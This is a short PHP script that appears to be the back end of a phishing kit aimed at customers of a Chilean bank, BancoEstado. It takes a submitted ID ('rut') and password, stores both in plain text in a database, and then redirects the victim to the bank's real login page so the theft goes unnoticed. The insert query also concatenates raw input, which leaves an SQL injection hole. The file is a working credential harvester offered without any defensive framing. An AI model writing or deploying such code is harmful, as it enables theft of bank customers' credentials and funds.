<?php
	require 'db.php';

	$username = $_POST['username'];
	$password = $_POST['password'];

	$insertar = "INSERT INTO `users` (rut, pass) VALUES ('$username', '$password')";
	$query = mysqli_query($conectar, $insertar);
	if($query)
		header("Location: https://bancapersonas.bancoestado.cl/eBankingBech/login/caja_login.htm")
	
?>